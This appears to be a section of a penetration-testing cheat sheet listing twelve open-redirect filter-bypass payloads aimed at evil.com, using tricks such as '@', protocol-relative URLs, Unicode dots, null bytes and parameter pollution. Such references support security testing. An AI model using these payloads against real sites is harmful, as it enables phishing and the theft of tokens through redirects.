## Filter Bypass

1. Using a whitelisted domain or keyword
```
target.com.evil.com
```

2. Using "//" to bypass "http" blacklisted keyword
```
//evil.com
```

3. Using "https:" to bypass "//" blacklisted keyword
```
https:evil.com
```

4. Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
```
\/\/evil.com/
/\/evil.com/
```

5. Using "%E3%80%82" to bypass "." blacklisted character
```
/?redir=evil。com
/?redir=evil%E3%80%82com
```

6. Using null byte "%00" to bypass blacklist filter
```
//evil%00.com
```

7. Using parameter pollution
```
?next=target.com&next=evil.com
```

8. Using "@" character, browser will redirect to anything after the "@"
```
target.com@evil.com
target.com%40evil.com
```

9. Creating folder as their domain
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

10.  Using "?" characted, browser will translate it to "/?"
```
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```

11. Host/Split Unicode Normalization
```
https://evil.c℀.example.com
```

12. Using parsing
```
http://ⓔⓥⓘⓛ.ⓒⓞⓜ
```